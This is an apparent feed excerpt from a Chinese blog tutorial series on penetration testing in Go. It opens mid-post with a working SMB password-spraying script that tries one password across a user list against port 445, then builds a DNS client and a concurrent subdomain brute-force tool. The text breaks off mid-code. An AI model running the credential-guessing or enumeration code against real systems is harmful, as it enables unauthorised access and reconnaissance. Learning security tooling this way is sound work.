class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/blackhat-go/bhg/ch-6/smb/smb&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">5</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;Usage: main &lt;/user/file&gt; &lt;password&gt; &lt;domain&gt; &lt;target_host&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf, err := ioutil.ReadFile(os.Args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">options := smb.Options&#123;</span><br><span class="line">Password: os.Args[<span class="number">2</span>],</span><br><span class="line">Domain:   os.Args[<span class="number">3</span>],</span><br><span class="line">Host:     os.Args[<span class="number">4</span>],</span><br><span class="line">Port:     <span class="number">445</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users := bytes.Split(buf, []<span class="type">byte</span>&#123;<span class="string">&#x27;\n&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> _, user := <span class="keyword">range</span> users &#123;</span><br><span class="line">options.User = <span class="type">string</span>(user)</span><br><span class="line">session, err := smb.NewSession(options, <span class="literal">false</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[-] Login failed: %s\\%s [%s]\n&quot;</span>,</span><br><span class="line">options.Domain,</span><br><span class="line">options.User,</span><br><span class="line">options.Password)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> session.Close()</span><br><span class="line"><span class="keyword">if</span> session.IsAuthenticated &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] Success     : %s\\%s [%s]\n&quot;</span>,</span><br><span class="line">options.Domain,</span><br><span class="line">options.User,</span><br><span class="line">options.Password)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-通过pass-the-hash重用密码"><a href="#0x04-通过pass-the-hash重用密码" class="headerlink" title="0x04 通过pass the hash重用密码"></a>0x04 通过pass the hash重用密码</h2><p>先搁一下，学内网的时候在返回来看。</p>]]></content>
    
    
    <summary type="html">与SMB和NTLM交互</summary>
    
    
    
    <category term="Go渗透测试" scheme="https://h0ld1rs.github.io/categories/Go%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang,渗透测试" scheme="https://h0ld1rs.github.io/tags/Golang-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(五)</title>
    <link href="https://h0ld1rs.github.io/posts/12296.html"/>
    <id>https://h0ld1rs.github.io/posts/12296.html</id>
    <published>2022-03-04T10:17:05.000Z</published>
    <updated>2022-03-05T03:19:41.496Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试笔记-五-–DNS的利用"><a href="#Go渗透测试笔记-五-–DNS的利用" class="headerlink" title="Go渗透测试笔记(五)–DNS的利用"></a>Go渗透测试笔记(五)–DNS的利用</h1><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h2><p>DNS用于定位Internet，并将其转化为IP地址。他可以成为攻击者手段的有效武器。因为组织通常允许协议的出站连接离开受限制的网络，并且无法充分监视其使用。</p><h2 id="0x01-编写DNS客户端"><a href="#0x01-编写DNS客户端" class="headerlink" title="0x01 编写DNS客户端"></a>0x01 编写DNS客户端</h2><p>Go本质上可以用内置的包<code>net</code>，支持大多数的<code>DNS</code>类型，内置包的好处在于<code>简单易用的API</code>，例如<code>LookupAddr(addr string)</code>返回给定IP地址的主机名列表，但是使用内置包也有缺点:<code>无法指定目标服务器</code>，不过，该包会使用操作系统配置的解析器。另一个缺点是：<code>无法对结果进行深入检查</code></p><p>为了解决这个问题，我们使用一个优秀的由<code>Miek Gieben</code>编写的第三方包，即<code>Go DNS</code>包</p><p>同样，安装命令如下：</p><p><code>go get github.com/miekg/dns</code></p><h3 id="1-检索A记录"><a href="#1-检索A记录" class="headerlink" title="1. 检索A记录"></a>1. 检索A记录</h3><p>编写如下代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/miekg/dns&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> msg dns.Msg</span><br><span class="line">fqdn := dns.Fqdn(<span class="string">&quot;baidu.com&quot;</span>)</span><br><span class="line">msg.SetQuestion(fqdn,dns.TypeA)</span><br><span class="line">dns.Exchange(&amp;msg,<span class="string">&quot;8.8.8.8:53&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>FQDN 完全限定域名，该域名指定主机在DNS结构中的精确位置，然后使用一种成为<code>A</code>记录的DNS记录，将该<code>FQDN</code>地址解析为IP地址。</p></blockquote><p>首先，创建一个信的Msg，然后将域转换为可以与DNS服务器交换的FQDN。接下来使用<code>TypeA</code>代表查找A记录</p><p>这里DNS服务器涉及到一个问题</p><blockquote><p> DNS解析中的A记录、AAAA记录、CNAME记录、MX记录、NS记录、TXT记录、SRV记录、URL转发等 </p><p> <strong>A</strong>记录： 将域名指向一个IPv4地址（例如：100.100.100.100），需要增加A记录</p><p> NS记录： 域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录</p><p> SOA记录： SOA叫做起始授权机构记录，NS用于标识多台域名解析服务器，SOA记录用于在众多NS记录中标记哪一台是主服务器</p><p> MX记录： 建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录</p><p> TXT记录： 可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录</p></blockquote><p>然后，调用<code>Exchange(*Msg,string)</code>，将消息发送到提供的服务器地址，在本例中使用的是<code>Goole的DNS服务器地址</code></p><p>接下来，我们使用<code>wirshark</code>进行数据包的分析</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304190141.png"></p><p>会得到如下的数据，通过捕获的数据包，我们可以看到通过<code>UDP</code>53与<code>8.8.8.8</code>端口连接，还可以看到与<code>DNS</code>信息有关的部分</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304190320.png"></p><p>可以看到在请求<code>DNS</code>A记录的同时，将查询先发送给8.8.8.8，然后再从8.8.8.8返回，包含以及解析的IP地址,<code>220.181.38.251</code></p><h3 id="2-使用Msg结构体处理应答"><a href="#2-使用Msg结构体处理应答" class="headerlink" title="2. 使用Msg结构体处理应答"></a>2. 使用<code>Msg</code>结构体处理应答</h3><p>从<code>Exchange(*Msg,string)</code>返回的值是<code>(*Msg error)</code>，返回的错误类型是可以接受的，那，为什么返回了(*Msg)呢？</p><p>先看一下<code>Msg</code>的定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Msg <span class="keyword">struct</span> &#123;</span><br><span class="line">MsgHdr</span><br><span class="line">Compress <span class="type">bool</span>       <span class="string">`json:&quot;-&quot;`</span> <span class="comment">// If true, the message will be compressed when converted to wire format.</span></span><br><span class="line">Question []Question <span class="comment">// Holds the RR(s) of the question section.</span></span><br><span class="line">Answer   []RR       <span class="comment">// Holds the RR(s) of the answer section.</span></span><br><span class="line">Ns       []RR       <span class="comment">// Holds the RR(s) of the authority section.</span></span><br><span class="line">Extra    []RR       <span class="comment">// Holds the RR(s) of the additional section.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结构体包含问询和应答，这使得我们可以将所有<code>DNS</code>合并为一个统一的结构体，结构体<code>Msg</code>拥有多种处理起来也更为容易的方法。</p><p>例如，我么可以使用<code>SetQuestion()</code>修改切片<code>Question</code>，也可以使用方法<code>append()</code>直接修改此切片,可以获得相同的结果。切片<code>Answer</code>，保存查询的情况，其类型为<code>RR</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/miekg/dns&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> msg dns.Msg</span><br><span class="line">fqdn := dns.Fqdn(<span class="string">&quot;baidu.com&quot;</span>)</span><br><span class="line">msg.SetQuestion(fqdn,dns.TypeA)</span><br><span class="line">in ,err := dns.Exchange(&amp;msg,<span class="string">&quot;8.8.8.8:53&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span>&#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;No records&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _,answer := <span class="keyword">range</span> in.Answer&#123;</span><br><span class="line"><span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;</span><br><span class="line">fmt.Println(a.A)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先，从储存的<code>Exchange</code>返回的值，是否存在错误，则调用<code>panic</code>停止程序。可以快速确定堆栈跟踪，并确定错误发生的位置。接下来，先确认<code>Answer</code>的长度至少为1，如果不是，则表明没有记录，则立即返回。毕竟在某些情况下，域名无法解析。</p><p>类型<code>RR</code>，是一个具有两个方法的接口，并且都不允许访问应答中存储的<code>IP</code>地址，要访问这些地址，需要执行类型声明以将<code>数据实例</code>创建为所需要的类型。首先遍历所有应答，然后，对应答类型进行断言。以确保我们正在处理的类型全部是<code>*dns.A</code>的类型。</p><h3 id="3-枚举子域"><a href="#3-枚举子域" class="headerlink" title="3. 枚举子域"></a>3. 枚举子域</h3><p>现在已经可以使用<code>Go</code>创建一个DNS客户端了，在本节中，我们创建一个枚举的子域的工具。</p><p>当我们开始编写工具的时候，必须确定工具使用了那些参数，我们要写的工具参数，包括目标域，包含要猜测的子域文件名，要使用的DNS服务器以及要启动的工作程序数量。Go提供了一个有用的<code>flag</code>包，我们将使用这个包去处理命令参数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">flDomain = flag.String(<span class="string">&quot;domain&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;要猜解的域名&quot;</span>)</span><br><span class="line">flWordlist = flag.String(<span class="string">&quot;wordlist&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;猜解所使用的字典&quot;</span>)</span><br><span class="line">flWorkerCount = flag.Int(<span class="string">&quot;c&quot;</span>,<span class="number">100</span>,<span class="string">&quot;所使用的线程&quot;</span>)</span><br><span class="line">flServerAddr = flag.String(<span class="string">&quot;Server&quot;</span>,<span class="string">&quot;8.8.8.8:53&quot;</span>,<span class="string">&quot;所使用的DNS服务器&quot;</span>)</span><br><span class="line">)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这种方式违反了    <code>Unix</code>法则，因为它定义了一些非可选的参数，当然此处也可以使用<code>os.Args</code>，但是使用<code>flag</code>包能更好的便捷理解</p></blockquote><p>但是，此时的程序时不能编译通过的，我们会收到使用未知变量的错误。我们需要加入以下代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> *flDomain == <span class="string">&quot;&quot;</span> || *flWordlist == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;-domain and -wordlist are required&quot;</span>)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了我们的工具可以输出解析的域名以及各自的IP，我们将创建一个结构类型来储存此信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> result <span class="keyword">struct</span> &#123;</span><br><span class="line">IPAddress <span class="type">string</span></span><br><span class="line">Hostname  <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此工具查询的两种主要的记录类型：A和<code>CNAME</code>，我们将使用单独的函数执行每个查询，每个函数只执行一种操作。</p><blockquote><p>(Canonical Name)记录，(alias from one domain name to another)通常称别名指向 。<br>通俗点讲就是给你的域名起一个别名。比如你的域名是<a href="http://www.abc.com，想和你的另外一个域名www.cba.com进行绑定，应该在cname的host中填入www，在points中填入www.cba.com。这样一来当你访问www.abc.com的时候自动跳转到www.cba.com，而且浏览器上显示的域名仍然是www.abc.com。看了这个你可能会混淆解析和绑定的区别，很多站长认为将一个域名（www.abc.com）cname到另外一个域名（www.cba.com)之后就可以实现:访问www.abc.com得到www.cba.com的内容">www.abc.com，想和你的另外一个域名www.cba.com进行绑定，应该在cname的host中填入www，在points中填入www.cba.com。这样一来当你访问www.abc.com的时候自动跳转到www.cba.com，而且浏览器上显示的域名仍然是www.abc.com。看了这个你可能会混淆解析和绑定的区别，很多站长认为将一个域名（www.abc.com）cname到另外一个域名（www.cba.com)之后就可以实现:访问www.abc.com得到www.cba.com的内容</a>.<br>把cName和转向功能混为一谈了。cName只能保证<a href="http://www.abc.com的解析和www.cba.com同步起来,如果是共享ip的主机,不绑定还是访问不到网站内容.这就是为什么如果你设置cname到你的新浪sae域名,如果sae没有将你和他绑定你还是访问不了他的原因./">www.abc.com的解析和www.cba.com同步起来，如果是共享ip的主机，不绑定还是访问不到网站内容。这就是为什么如果你设置cname到你的新浪sae域名，如果sae没有将你和他绑定你还是访问不了他的原因。</a></p></blockquote><h3 id="4-查询A记录和CNAME记录"><a href="#4-查询A记录和CNAME记录" class="headerlink" title="4. 查询A记录和CNAME记录"></a>4. 查询A记录和CNAME记录</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupA</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> ips []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;</span><br><span class="line">ips = <span class="built_in">append</span>(ips, a.A.String())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ips, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupCNAME</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> fqdns []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> c, ok := answer.(*dns.CNAME); ok &#123;</span><br><span class="line">fqdns = <span class="built_in">append</span>(fqdns, c.Target)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fqdns, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>CNAME 记录一个FQDN指向另一个FQDN作为自己的别名。假如<code>example.com</code>组织的所有者希望通过wordpress托管来托管 wordpress网站。该服务可能有上百种ip，用于平衡其所有用户的站点，因此不可能提供单个的IP地址。wordpress可能为<code>example.com</code>提供一个CNAME，因此，<code>example.com</code>的<code>CNAME</code>可能指向<code>someserver.hostingcompany.org</code>，而CNAME的A记录则指向一个IP地址，这允许<code>example.com</code>的所有者将其站点托管再没有IP信息的服务器上面。</p><p>因此，我们需要追踪CNAME的痕迹，才能找到最有效的A记录。</p></blockquote><p>接下来我们定义lookup方法来使用CNAME追踪A记录</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookup</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> []result &#123;</span><br><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line"><span class="keyword">var</span> cfqdn = fqdn <span class="comment">// Don&#x27;t modify the original.</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">cnames, err := lookupCNAME(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; <span class="built_in">len</span>(cnames) &gt; <span class="number">0</span> &#123;</span><br><span class="line">cfqdn = cnames[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">continue</span> <span class="comment">// We have to process the next CNAME.</span></span><br><span class="line">&#125;</span><br><span class="line">ips, err := lookupA(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// There are no A records for this hostname.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, ip := <span class="keyword">range</span> ips &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, result&#123;IPAddress: ip, Hostname: fqdn&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// We have processed all the results.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> results</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过循环一直找到解析的末尾，从而跟踪CNAME的痕迹。</p><h3 id="5-工人函数"><a href="#5-工人函数" class="headerlink" title="5. 工人函数"></a>5. 工人函数</h3><p>我们要实现高并发，需要将工作分配给工人函数。</p><p>我们创建<code>worker()</code>函数，该函数使用三个通道函数，一个用于通知工人是否已经关闭通道，一个用于接受工作通道，一个用于发送结果。该函数还需要一个参数来指定要使用的DNS服务器</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> empty <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(tracker <span class="keyword">chan</span> empty, fqdns <span class="keyword">chan</span> <span class="type">string</span>, gather <span class="keyword">chan</span> []result, serverAddr <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> fqdn := <span class="keyword">range</span> fqdns &#123;<span class="comment">//在域通道上进行循环</span></span><br><span class="line">results := lookup(fqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(results) &gt; <span class="number">0</span> &#123;</span><br><span class="line">gather &lt;- results</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在引入函数<code>worker()</code>之前，我们需要定义一个名为<code>empty</code>的结构体，当工人完成工作时，进行跟踪记录。</p><p>在有结果的时候，发送到<code>gather</code>通道。 最后，当所有的工作完成的时候，在通道<code>tracker</code>上发送一个空结构体，表示所有工作都已完成。如果不这样做，将会使得处于竞争状态，因为调用者可能在收到结果之前退出。</p><p>之后，我们设置要传递的通道</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line">fqdns := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, *flWorkerCount)</span><br><span class="line">gather := <span class="built_in">make</span>(<span class="keyword">chan</span> []result)</span><br><span class="line">tracker := <span class="built_in">make</span>(<span class="keyword">chan</span> empty)</span><br></pre></td></tr></table></figure><h3 id="6-使用-bufio包进行一个文本扫描器"><a href="#6-使用-bufio包进行一个文本扫描器" class="headerlink" title="6. 使用 bufio包进行一个文本扫描器"></a>6. 使用 bufio包进行一个文本扫描器</h3><p>打开文件之后，使用<code>bufio</code>包创建一个新的<code>Scanner</code>，该文本扫描器允许我们一行行的读</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fh, err := os.Open(*flWordlist)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fh.Close()</span><br><span class="line">scanner := bufio.NewScanner(fh)</span><br></pre></td></tr></table></figure><p>我们使用新的文本扫描器从用户提供的<code>wordlist</code>中抓取一行文本，并通过文本和用户提供的域结合在一起，组成信的<code>FQDN</code>,需要将结果发送到<code>fqdns</code>通道，但首先需要启动工人函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> worker(tracker, fqdns, gather, *flServerAddr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> scanner.Scan() &#123;</span><br><span class="line">fqdns &lt;- fmt.Sprintf(<span class="string">&quot;%s.%s&quot;</span>, scanner.Text(), *flDomain)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-收集和显示结果"><a href="#7-收集和显示结果" class="headerlink" title="7. 收集和显示结果"></a>7. 收集和显示结果</h3><p>首先启动一个匿名的<code>gorountine</code>，它将收集工人的结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> r := <span class="keyword">range</span> gather &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, r...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过遍历通道<code>gather</code>，可以将接收到的结果，添加到切片<code>result</code>上，由于需要将切片附加到另一个切片上，所以需要<code>...</code>，之后关闭通道。</p><p>剩下的就是关闭通道，并且展现结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">close</span>(fqdns)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line">&lt;-tracker</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(gather)</span><br><span class="line">&lt;-tracker</span><br></pre></td></tr></table></figure><p>此时结果尚未呈现给用户，我们需要将其打印</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">w := tabwriter.NewWriter(os.Stdout, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> results &#123;</span><br><span 